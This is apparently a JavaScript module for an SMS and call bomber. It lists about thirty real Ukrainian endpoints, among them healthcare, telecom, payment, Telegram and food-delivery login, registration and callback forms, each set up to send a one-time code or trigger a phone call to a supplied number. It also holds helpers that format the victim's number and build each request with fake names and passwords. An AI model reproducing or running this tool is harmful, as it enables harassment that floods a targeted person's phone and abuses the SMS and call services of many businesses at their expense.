export const verifiedServices = [
  {
    name: "Helsi Login",
    category: "healthcare",
    method: "POST",
    url: "https://helsi.me/api/healthy/v2/accounts/login",
    headers: { "Content-Type": "application/json", "Referer": "https://helsi.me/" },
    data: { phone: "{phone}", platform: "PISWeb" }
  },
  {
    name: "Helsi Send",
    category: "healthcare",
    method: "POST",
    url: "https://helsi.me/api/healthy/v2/accounts/send",
    headers: { "Content-Type": "application/json", "Referer": "https://helsi.me/" },
    data: { phone: "{phone}", platform: "PISWeb" }
  },
  {
    name: "Multiplex",
    category: "entertainment",
    method: "POST",
    url: "https://auth2.multiplex.ua/login",
    headers: { "Content-Type": "application/json", "Referer": "https://friends.multiplex.ua/", "X-Mx-Source": "WEB-FRIENDS" },
    data: { login: "{phone}" }
  },
  {
    name: "Comfy",
    category: "ecommerce",
    method: "POST",
    url: "https://comfy.ua/api/auth/password/dynamic",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://comfy.ua/ua/" },
    formData: "login[username]=+{phoneFormatted1}",
    phoneFormat: "+XX(XXX)-XXX-XX-XX"
  },
  {
    name: "Vodafone Registration",
    category: "telecom",
    method: "POST",
    url: "https://registration.vodafone.ua/api/v1/process/smsCode",
    headers: { "Content-Type": "application/json", "Referer": "https://registration.vodafone.ua/" },
    data: { number: "{phone}" }
  },
  {
    name: "Vodafone MW API",
    category: "telecom",
    method: "POST",
    url: "https://mw-api.vodafone.ua/otp/api/one-time-password/secured",
    headers: { "Content-Type": "application/json", "Referer": "https://my.vodafone.ua/" },
    data: { receiver: "{phone}", type: "SIGN_UP" }
  },
  {
    name: "Portmone",
    category: "payments",
    method: "POST",
    url: "https://api.portmone.com.ua/auth/v2/registration",
    headers: { "Content-Type": "application/json", "Referer": "https://www.portmone.com.ua/auth#signup" },
    data: { client_id: "62608e08adc29a8d6dbc9754e659f125", phone_prefix: "380", phone_number: "{phoneLocal}", password: "Qwerty123!" }
  },
  {
    name: "EasyPay",
    category: "payments",
    method: "POST",
    url: "https://auth.easypay.ua/api/check",
    headers: { "Content-Type": "application/json", "Referer": "https://easypay.ua/" },
    data: { phone: "{phone}" }
  },
  {
    name: "Telegram",
    category: "messenger",
    method: "POST",
    url: "https://my.telegram.org/auth/send_password",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    formData: "phone=+{phone}"
  },
  {
    name: "966.ua",
    category: "ecommerce",
    method: "POST",
    url: "https://966.ua/esputnik/getUserByPhone",
    headers: { "Content-Type": "application/json", "Referer": "https://966.ua/" },
    data: { phone: "+{phone}" }
  },
  {
    name: "Sushiya",
    category: "food",
    method: "POST",
    url: "https://www.sushiya.ua/api/v1/user/auth",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://www.sushiya.ua/" },
    formData: "phone={phoneNoCode}&need_skeep="
  },
  {
    name: "PizzaDay",
    category: "food",
    method: "POST",
    url: "https://pizzaday.eatery.club/site/v1/pre-login",
    headers: { "Content-Type": "application/json", "Referer": "https://www.pizzaday.com.ua/" },
    data: { phone: "{phone}" }
  },
  {
    name: "GoGo Pizza",
    category: "food",
    method: "POST",
    url: "https://gogo-pizza.eatery.club/site/v1/pre-login",
    headers: { "Content-Type": "application/json" },
    data: { phone: "{phone}" }
  },
  {
    name: "Bi.ua",
    category: "ecommerce",
    method: "POST",
    url: "https://bi.ua/api/v1/accounts",
    headers: { "Content-Type": "application/json", "Referer": "https://bi.ua/ukr/signup/" },
    data: { grand_type: "call_code", phone: "+{phone}" }
  },
  {
    name: "Vilki Palki",
    category: "food",
    method: "POST",
    url: "https://vilki-palki.od.ua/api/secret/generate?lang=ukrainian",
    headers: { "Content-Type": "application/json", "Referer": "https://vilki-palki.od.ua/" },
    data: { phone: "+{phone}" }
  },
  {
    name: "SMS Fly",
    category: "sms_service",
    method: "POST",
    url: "https://sms-fly.ua/registration/confirm/",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://sms-fly.ua/ru/registration/" },
    formData: "step=1&user_name={phone}"
  },
  {
    name: "Motozilla",
    category: "ecommerce",
    method: "POST",
    url: "https://motozilla.com.ua/signup/",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://motozilla.com.ua/signup/", "Upgrade-Insecure-Requests": "1" },
    formData: "data[lastname]=Test&data[firstname]=Test&data[phone]={phone}&data[email]=test@test.com&wa_json_mode=1&need_redirects=1&contact_type=person"
  },
  {
    name: "Yaposhka",
    category: "food",
    method: "POST",
    url: "https://yaposhka.com.ua/ua/brander_smsconfirm_customer/process/init/",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://yaposhka.com.ua/" },
    formData: "form_action=https://yaposhka.com.ua/ua/brander_smsconfirm_customer/process/init/&telephone=+{phoneFormatted2}"
  },
  {
    name: "Phonet Call 1",
    category: "callback",
    method: "POST",
    url: "https://origami.phonet.com.ua/rest/public/widget/call-catchers/d494caf7-b9df-43ea-9148-e4871ba6cfe8/call",
    headers: { "Content-Type": "application/json" },
    data: { phone: "+{phone}" },
    type: "call"
  },
  {
    name: "Phonet Call 2",
    category: "callback",
    method: "POST",
    url: "https://origami.phonet.com.ua/rest/public/widget/call-catchers/24882f40-7a0d-4b8b-8bc0-b290c725c281/call",
    headers: { "Content-Type": "application/json" },
    data: { phone: "+{phone}" },
    type: "call"
  },
  {
    name: "Frutalina Callback",
    category: "callback",
    method: "POST",
    url: "https://frutalina.com.ua/callmeback/",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    formData: "url=https://frutalina.com.ua/callmeback/&user=Test&phone={phone}&time_to_call=",
    type: "call"
  },
  {
    name: "DeliveryFlower Callback",
    category: "callback",
    method: "POST",
    url: "https://deliveryflower.com.ua/pravku/call.php",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    formData: "telfon={phone}",
    type: "call"
  },
  {
    name: "Karuzo",
    category: "food",
    method: "POST",
    url: "https://karuzo.ua/index.php?route=callback/callback/send",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    formData: "phone={phoneNoCode}"
  },
  {
    name: "Smaki Maki",
    category: "food",
    method: "POST",
    url: "https://smaki-maki.com/wp-admin/admin-ajax.php",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://smaki-maki.com/", "X-Requested-With": "XMLHttpRequest" },
    formData: "name=Test&phone=+{phoneFormatted3}&birthday=01.01.2000&password=Test123!&password2=Test123!&code=&action=register_user&nonce_code=9b2bc24717"
  },
  {
    name: "Farsh",
    category: "food",
    method: "POST",
    url: "https://farsh.in.ua/wp-admin/admin-ajax.php",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://farsh.in.ua/", "X-Requested-With": "XMLHttpRequest" },
    formData: "action=user_login&formData=tel=+{phoneFormatted3}"
  },
  {
    name: "Pomidoros",
    category: "food",
    method: "POST",
    url: "https://pomidoros.com.ua/wp-content/themes/pomidoros/includes/register_login.php",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://pomidoros.com.ua/yslovia-dostavki/" },
    formData: "register[]=1&register[]=&register[]=+{phoneFormatted3}"
  },
  {
    name: "Pronto Pizza",
    category: "food",
    method: "POST",
    url: "https://prontopizza.ua/wp-admin/admin-ajax.php",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://prontopizza.ua/", "X-Requested-With": "XMLHttpRequest" },
    formData: "first_name=Test&last_name=Test&birthday=01.01.2000&phone=+{phoneFormatted3}&action=register"
  },
  {
    name: "InstaFood Callback",
    category: "callback",
    method: "POST",
    url: "https://instafood.com.ua/ajax/callback-form",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
    formData: "forms=forms-callback-application&modal=1&name=Test&phone=+{phoneFormatted3}",
    type: "call"
  },
  {
    name: "Yoki",
    category: "food",
    method: "POST",
    url: "https://yoki.ua/lviv/wp-admin/admin-ajax.php",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
    formData: "first_name=Test&email=test@test.com&phone=+{phoneFormatted3}&action=register"
  }
];

export const formatPhone = (phone, format) => {
  const cleaned = phone.replace(/\D/g, '').replace(/^0/, '380');
  const p = cleaned.startsWith('380') ? cleaned : '380' + cleaned;
  
  switch(format) {
    case 'international': return p;
    case 'plus': return '+' + p;
    case 'local': return p.slice(3);
    case 'formatted1': return `+${p.slice(0,2)}(${p.slice(2,5)})-${p.slice(5,8)}-${p.slice(8,10)}-${p.slice(10,12)}`;
    case 'formatted2': return `+${p.slice(0,2)} (${p.slice(2,5)}) ${p.slice(5,8)}-${p.slice(8,10)}-${p.slice(10,12)}`;
    case 'formatted3': return `${p.slice(0,2)} (${p.slice(2,5)}) ${p.slice(5,8)} ${p.slice(8,10)} ${p.slice(10,12)}`;
    default: return p;
  }
};

export const buildRequest = (service, phone) => {
  const p = formatPhone(phone, 'international');
  
  const replacements = {
    '{phone}': p,
    '{phoneLocal}': p.slice(3),
    '{phoneNoCode}': p.slice(2),
    '{phoneFormatted1}': formatPhone(phone, 'formatted1'),
    '{phoneFormatted2}': formatPhone(phone, 'formatted2'),
    '{phoneFormatted3}': formatPhone(phone, 'formatted3'),
  };
  
  let url = service.url;
  let body;
  
  if (service.formData) {
    body = service.formData;
    for (const [key, val] of Object.entries(replacements)) {
      body = body.replace(new RegExp(key.replace(/[{}]/g, '\\$&'), 'g'), val);
    }
  } else if (service.data) {
    body = JSON.stringify(service.data);
    for (const [key, val] of Object.entries(replacements)) {
      body = body.replace(new RegExp(key.replace(/[{}]/g, '\\$&'), 'g'), val);
    }
    body = JSON.parse(body);
  }
  
  return { url, method: service.method, headers: service.headers, body };
};

export default verifiedServices;
